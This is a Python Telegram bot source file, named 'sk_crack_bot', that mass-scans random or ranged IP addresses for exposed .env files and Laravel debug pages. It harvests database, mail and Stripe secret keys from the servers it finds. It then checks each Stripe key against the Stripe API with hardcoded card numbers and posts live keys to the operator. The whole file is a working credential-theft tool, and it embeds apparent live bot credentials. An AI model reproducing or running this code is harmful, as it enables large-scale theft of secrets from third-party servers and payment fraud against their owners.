import os
import re
import time
import ipaddress
import requests
import urllib3
import subprocess
import shutil
import sys
import random
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool
from faker import Faker
from pyrogram import Client, filters
from pyrogram.types import Message, Document
from pyrogram.enums import ParseMode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Bot configuration
API_ID = 23933044  # Replace with your API ID
API_HASH = '6df11147cbec7d62a323f0f498c8c03a'  # Replace with your API HASH
BOT_TOKEN = '8009378045:AAGjYn7iN9iCXrSlsmkRlq04utJisIayU1c'  # Replace with your bot token

app = Client("sk_crack_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

approved_users = set()
approved_groups = set()

# Create necessary directories
os.makedirs('DEBUG', exist_ok=True)
os.makedirs('ENVS', exist_ok=True)
os.makedirs('RESULTS', exist_ok=True)

try:
    with open('auth_users.txt', 'r') as user_file:
        approved_users = set(line.strip() for line in user_file)
except FileNotFoundError:
    pass

try:
    with open('auth_groups.txt', 'r') as group_file:
        approved_groups = set(line.strip() for line in group_file)
except FileNotFoundError:
    pass

def format_bold(text):
    """Format text in Serif Bold using HTML formatting"""
    return f"<b>{text}</b>"

def update_progress(message, current, total, env_found=0, sk_found=0, live_sk=0, dead_sk=0, custom_sk=0, scan_type="LIVE"):
    """Update progress message every 15 seconds"""
    percentage = (current / total) * 100 if total > 0 else 0
    progress_bar = "█" * int(percentage / 5) + "░" * (20 - int(percentage / 5))
    
    if scan_type == "LIVE":
        progress_text = (
            f"{format_bold('Live IP Scanner')}\n\n"
            f"Progress: [{progress_bar}] {percentage:.1f}%\n"
            f"Checked: {current}/{total}\n"
            f"Live IPs Found: {env_found}\n"
            f"Status: Scanning..."
        )
    else:  # ENV Scanner
        progress_text = (
            f"{format_bold('ENV & Debug Scanner')}\n\n"
            f"Progress: [{progress_bar}] {percentage:.1f}%\n"
            f"Checked: {current}/{total}\n"
            f"ENV Files: {env_found}\n"
            f"Total SK Keys: {sk_found}\n"
            f"Live SK: {live_sk}\n"
            f"Custom SK: {custom_sk}\n"
            f"Dead SK: {dead_sk}\n"
            f"Status: Scanning..."
        )
    
    return progress_text

@app.on_message(filters.command(["start", "help"]))
async def send_instructions(client, message: Message):
    instructions = (
        f"{format_bold('Welcome to the IP Tools bot!')}\n\n"
        f"{format_bold('Use the following commands:')}\n"
        "/gen - Generate random IP addresses\n"
        "/range - Generate IP addresses in a range\n"
        "/live - Check if IP addresses are live\n"
        "/env - Check for .env files, debug endpoints and SK keys"
    )
    await message.reply_text(instructions, parse_mode=ParseMode.HTML)

@app.on_message(filters.command("gen"))
async def send_ipgen_request(client, message: Message):
    command_args = message.text.split()
    if len(command_args) == 1:
        await message.reply_text("/gen 10")
        return
    
    try:
        num_ip = int(command_args[1])
        await generate_ip(message, num_ip)
    except ValueError:
        await message.reply_text("Please enter a valid number of IP addresses.")

async def generate_ip(message: Message, num_ip: int):
    ips = []
    faker = Faker()
    for _ in range(num_ip):
        ips.append(faker.ipv4())
    
    filename = f"RESULTS/ips_{int(time.time())}.txt"
    with open(filename, 'w') as ip_file:
        ip_file.write('\n'.join(ips))

    with open(filename, 'rb') as file:
        message_text = f"{format_bold(f'{len(ips)} IP generated successfully')}"
        await message.reply_document(
            document=file,
            caption=message_text,
            parse_mode=ParseMode.HTML
        )

    os.remove(filename)

@app.on_message(filters.command("range"))
async def generate_ip_range(client, message: Message):
    if str(message.from_user.id) not in approved_users:
        await message.reply_text("You are not approved to use this command.")
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        await message.reply_text("/range 0.0.0.0 0.0.0.1")
        return

    start_ip_str = command_parts[1]
    end_ip_str = command_parts[2]

    try:
        start_ip = ipaddress.ip_address(start_ip_str)
        end_ip = ipaddress.ip_address(end_ip_str)
    except ValueError:
        await message.reply_text("Invalid IP address format.")
        return

    generated_ips = []
    for ip in ipaddress.summarize_address_range(start_ip, end_ip):
        generated_ips.extend(str(ip) for ip in ipaddress.IPv4Network(ip))

    filename = f"RESULTS/range_{int(time.time())}.txt"
    with open(filename, 'w') as file:
        file.write('\n'.join(generated_ips))

    with open(filename, 'rb') as file:
        message_text = f"{format_bold(f'IPs generated in range: {start_ip_str} - {end_ip_str}')}"
        await message.reply_document(
            document=file,
            caption=message_text,
            parse_mode=ParseMode.HTML
        )
    
    os.remove(filename)

@app.on_message(filters.command("live"))
async def check_liveip_command(client, message: Message):
    if message.reply_to_message and message.reply_to_message.document:
        await check_liveip(message)
    else:
        await message.reply_text("Reply with an IP file using /live")

async def check_liveip(message: Message):
    try:
        progress_msg = await message.reply_text(
            f"{format_bold('Starting Live IP Scanner...')}",
            parse_mode=ParseMode.HTML
        )
        
        file_info = message.reply_to_message.document
        
        if file_info.mime_type == 'text/plain':
            file_path = await app.download_media(message.reply_to_message.document)
            
            # Read targets from file
            with open(file_path, 'r') as file:
                urls = file.read().splitlines()
            
            total_urls = len(urls)
            liveip_result = []
            checked = 0
            last_update = time.time()
            
            # Create output file
            output_file = f"RESULTS/live_{int(time.time())}.txt"
            
            def check_ip(ip):
                nonlocal checked, last_update
                try:
                    r = requests.get(f'http://{ip}', timeout=3, verify=False)
                    if r.status_code == 200 or '<title>' in r.text:
                        # Write directly to file
                        with open(output_file, 'a') as f:
                            f.write(f"{ip}\n")
                        return ip
                except:
                    pass
                finally:
                    checked += 1
                    # Update progress every 15 seconds
                    if time.time() - last_update >= 15:
                        progress_text = update_progress(
                            progress_msg, checked, total_urls, 
                            scan_type="LIVE", env_found=len(liveip_result)
                        )
                        app.loop.create_task(progress_msg.edit_text(
                            progress_text, parse_mode=ParseMode.HTML
                        ))
                        last_update = time.time()
                return None

            # Use 200 workers
            with ThreadPoolExecutor(max_workers=200) as executor:
                results = list(executor.map(check_ip, urls))
                liveip_result = [r for r in results if r]

            await progress_msg.delete()
            
            if liveip_result:
                with open(output_file, 'rb') as file:
                    message_text = f"{format_bold(f'Found {len(liveip_result)} live IPs')}"
                    await message.reply_document(
                        document=file,
                        caption=message_text,
                        parse_mode=ParseMode.HTML
                    )
                
                # Clean up
                os.remove(output_file)
            else:
                await message.reply_text(
                    f"{format_bold('No live IP addresses found.')}", 
                    parse_mode=ParseMode.HTML
                )
            
            os.remove(file_path)
            
    except Exception as e:
        await message.reply_text(f"Error: {str(e)}")

@app.on_message(filters.command("env"))
async def scan_env_command(client, message: Message):
    if message.reply_to_message and message.reply_to_message.document:
        await scan_env_and_debug(message)
    else:
        await message.reply_text("Reply with an IP file using /env")

async def scan_env_and_debug(message: Message):
    try:
        progress_msg = await message.reply_text(
            f"{format_bold('Starting ENV & Debug Scanner...')}",
            parse_mode=ParseMode.HTML
        )
        
        file_info = message.reply_to_message.document
        
        if file_info.mime_type == 'text/plain':
            file_path = await app.download_media(message.reply_to_message.document)
            
            with open(file_path, 'r') as file:
                targets = file.read().splitlines()
            
            total_targets = len(targets)
            
            # Global counters
            checked = 0
            env_found = 0
            total_sk = 0
            live_sk = 0
            dead_sk = 0
            custom_sk = 0
            last_update = time.time()
            
            # Output files
            env_output = f"RESULTS/env_results_{int(time.time())}.txt"
            sk_live_file = f"RESULTS/sk_live_{int(time.time())}.txt"
            sk_dead_file = f"RESULTS/sk_dead_{int(time.time())}.txt"
            sk_custom_file = f"RESULTS/sk_custom_{int(time.time())}.txt"
            
            # Credit card for testing
            numbers = [
                "4023470607106283", "4355460262657363", "4023470602125650",
                "5111010022465466", "4095950011560764"
            ]
            cc = random.choice(numbers)
            
            def check_stripe_key(stripe_key, url):
                """Check if Stripe key is live"""
                nonlocal live_sk, dead_sk, custom_sk
                try:
                    api_url = 'https://api.stripe.com/v1/tokens'
                    data = {
                        'card[number]': cc,
                        'card[exp_month]': '04',
                        'card[exp_year]': '2026',
                        'card[cvc]': '011'
                    }
                    session = requests.Session()
                    session.auth = (stripe_key, '')
                    session.verify = False
                    response = session.post(api_url, data=data)
                    
                    if '"id": "' in response.text:
                        live_sk += 1
                        with open(sk_live_file, 'a') as f:
                            f.write(f"{stripe_key} | Found in: {url}\n")
                        # Send notification directly to user
                        app.loop.create_task(message.reply_text(
                            f"{format_bold('🟢 LIVE SK KEY FOUND!')}\n"
                            f"Key: <code>{stripe_key}</code>\n"
                            f"Source: {url}",
                            parse_mode=ParseMode.HTML
                        ))
                    elif 'Sending credit' in response.text:
                        custom_sk += 1
                        with open(sk_custom_file, 'a') as f:
                            f.write(f"{stripe_key} | Found in: {url}\n")
                        app.loop.create_task(message.reply_text(
                            f"{format_bold('🟡 CUSTOM SK KEY FOUND!')}\n"
                            f"Key: <code>{stripe_key}</code>\n"
                            f"Source: {url}",
                            parse_mode=ParseMode.HTML
                        ))
                    else:
                        dead_sk += 1
                        with open(sk_dead_file, 'a') as f:
                            f.write(f"{stripe_key} | Found in: {url}\n")
                except:
                    dead_sk += 1
            
            def scan_target(target):
                """Scan single target for .env and debug"""
                nonlocal checked, env_found, total_sk, last_update
                results = []
                
                # Check for .env file
                try:
                    # Try HTTP first
                    r = requests.get(f'http://{target}/.env', verify=False, timeout=10, allow_redirects=False)
                    if r.status_code == 200:
                        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
                        if any(key in r.text for key in mch):
                            # Save .env content
                            env_filename = f"ENVS/{target.replace('/', '_')}_{int(time.time())}.txt"
                            with open(env_filename, 'w') as f:
                                f.write(r.text)
                            
                            results.append(f"ENV: http://{target}")
                            env_found += 1
                            
                            # Check for SK keys in .env
                            if "sk_live" in r.text:
                                lines = r.text.splitlines()
                                for line in lines:
                                    if "sk_live" in line:
                                        pattern = r'sk_live_[a-zA-Z0-9]+'
                                        matches = re.findall(pattern, line)
                                        for match in matches:
                                            total_sk += 1
                                            check_stripe_key(match, f"http://{target}/.env")
                except:
                    pass
                
                # Try HTTPS for .env
                try:
                    r = requests.get(f'https://{target}/.env', verify=False, timeout=10, allow_redirects=False)
                    if r.status_code == 200:
                        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
                        if any(key in r.text for key in mch):
                            env_filename = f"ENVS/{target.replace('/', '_')}_{int(time.time())}.txt"
                            with open(env_filename, 'w') as f:
                                f.write(r.text)
                            
                            results.append(f"ENV: https://{target}")
                            env_found += 1
                            
                            if "sk_live" in r.text:
                                lines = r.text.splitlines()
                                for line in lines:
                                    if "sk_live" in line:
                                        pattern = r'sk_live_[a-zA-Z0-9]+'
                                        matches = re.findall(pattern, line)
                                        for match in matches:
                                            total_sk += 1
                                            check_stripe_key(match, f"https://{target}/.env")
                except:
                    pass
                
                # Check for debug endpoint
                try:
                    data = {'debug': 'true'}
                    r = requests.post(f'https://{target}', data=data, allow_redirects=False, verify=False, timeout=10)
                    mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME', 'sk_live', 'APP_DEBUG']
                    
                    if any(key in r.text for key in mch):
                        # Save debug output
                        debug_filename = f"DEBUG/{target.replace('/', '_')}_{int(time.time())}.txt"
                        with open(debug_filename, 'w', encoding='utf-8') as f:
                            f.write(r.text)
                        
                        results.append(f"DEBUG: https://{target}")
                        
                        # Check for SK keys in debug output
                        if "sk_live" in r.text:
                            lines = r.text.splitlines()
                            for line in lines:
                                if "sk_live" in line:
                                    pattern = r'sk_live_[a-zA-Z0-9]+'
                                    matches = re.findall(pattern, line)
                                    for match in matches:
                                        total_sk += 1
                                        check_stripe_key(match, f"https://{target} (debug)")
                except:
                    pass
                
                checked += 1
                
                # Update progress every 15 seconds
                if time.time() - last_update >= 15:
                    progress_text = update_progress(
                        progress_msg, checked, total_targets,
                        env_found=env_found, sk_found=total_sk,
                        live_sk=live_sk, dead_sk=dead_sk,
                        custom_sk=custom_sk, scan_type="ENV"
                    )
                    app.loop.create_task(progress_msg.edit_text(
                        progress_text, parse_mode=ParseMode.HTML
                    ))
                    last_update = time.time()
                
                return results
            
            # Scan all targets with 200 workers
            all_results = []
            with ThreadPoolExecutor(max_workers=200) as executor:
                results = list(executor.map(scan_target, targets))
                for target_results in results:
                    if target_results:
                        all_results.extend(target_results)
                        # Write results immediately to file
                        with open(env_output, 'a') as f:
                            for res in target_results:
                                f.write(f"{res}\n")

            await progress_msg.delete()
            
            # Prepare final summary
            if all_results or env_found > 0:
                summary = [
                    f"{format_bold('🔍 SCAN COMPLETED')}\n",
                    f"Targets Checked: {checked}",
                    f"ENV Files Found: {env_found}",
                    f"Total SK Keys: {total_sk}",
                    f"Live SK: {live_sk}",
                    f"Custom SK: {custom_sk}",
                    f"Dead SK: {dead_sk}\n",
                ]
                
                if env_found > 0:
                    summary.append(f"{format_bold('Results saved in files:')}")
                    if os.path.exists(env_output):
                        summary.append(f"• ENV Results: {env_output}")
                    if os.path.exists(sk_live_file):
                        summary.append(f"• Live SK: {sk_live_file}")
                    if os.path.exists(sk_custom_file):
                        summary.append(f"• Custom SK: {sk_custom_file}")
                    if os.path.exists(sk_dead_file):
                        summary.append(f"• Dead SK: {sk_dead_file}")
                
                # Send summary
                await message.reply_text(
                    "\n".join(summary),
                    parse_mode=ParseMode.HTML
                )
                
                # Send result files
                if os.path.exists(env_output) and os.path.getsize(env_output) > 0:
                    with open(env_output, 'rb') as f:
                        await message.reply_document(
                            document=f,
                            caption=f"{format_bold('ENV & Debug Results')}",
                            parse_mode=ParseMode.HTML
                        )
                    os.remove(env_output)
                
                if os.path.exists(sk_live_file) and os.path.getsize(sk_live_file) > 0:
                    with open(sk_live_file, 'rb') as f:
                        await message.reply_document(
                            document=f,
                            caption=f"{format_bold('Live SK Keys')}",
                            parse_mode=ParseMode.HTML
                        )
                    os.remove(sk_live_file)
                
                if os.path.exists(sk_custom_file) and os.path.getsize(sk_custom_file) > 0:
                    with open(sk_custom_file, 'rb') as f:
                        await message.reply_document(
                            document=f,
                            caption=f"{format_bold('Custom SK Keys')}",
                            parse_mode=ParseMode.HTML
                        )
                    os.remove(sk_custom_file)
                
                if os.path.exists(sk_dead_file) and os.path.getsize(sk_dead_file) > 0:
                    with open(sk_dead_file, 'rb') as f:
                        await message.reply_document(
                            document=f,
                            caption=f"{format_bold('Dead SK Keys')}",
                            parse_mode=ParseMode.HTML
                        )
                    os.remove(sk_dead_file)
            else:
                await message.reply_text(
                    f"{format_bold('No .env files, debug endpoints, or SK keys found.')}\n"
                    f"Targets Checked: {checked}",
                    parse_mode=ParseMode.HTML
                )
            
            # Cleanup
            os.remove(file_path)
            
    except Exception as e:
        await message.reply_text(f"An error occurred during scanning: {str(e)}")

@app.on_message(filters.command("debug"))
async def debug_info(client, message: Message):
    """Debug information command"""
    debug_text = (
        f"{format_bold('Debug Information')}\n"
        f"User ID: {message.from_user.id}\n"
        f"Chat ID: {message.chat.id}\n"
        f"Approved User: {str(message.from_user.id) in approved_users}\n"
        f"Approved Group: {str(message.chat.id) in approved_groups}\n"
        f"Bot Running: True\n"
        f"Python Version: {subprocess.run(['python', '--version'], capture_output=True, text=True).stdout.strip()}\n"
        f"Current Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )
    await message.reply_text(debug_text, parse_mode=ParseMode.HTML)

def check_env_variables():
    """Check for required environment variables"""
    required_vars = ['API_ID', 'API_HASH', 'BOT_TOKEN']
    missing_vars = [var for var in required_vars if not globals().get(var)]
    
    if missing_vars:
        print(f"Missing environment variables: {', '.join(missing_vars)}")
        return False
    return True

if __name__ == '__main__':
    print(f"{format_bold('Bot Started')}")
    
    # Check environment variables
    if not check_env_variables():
        print("Please set all required environment variables")
        exit(1)
    
    # Create necessary directories
    os.makedirs('DEBUG', exist_ok=True)
    os.makedirs('ENVS', exist_ok=True)
    os.makedirs('RESULTS', exist_ok=True)
    
    # Run the bot
    app.run()
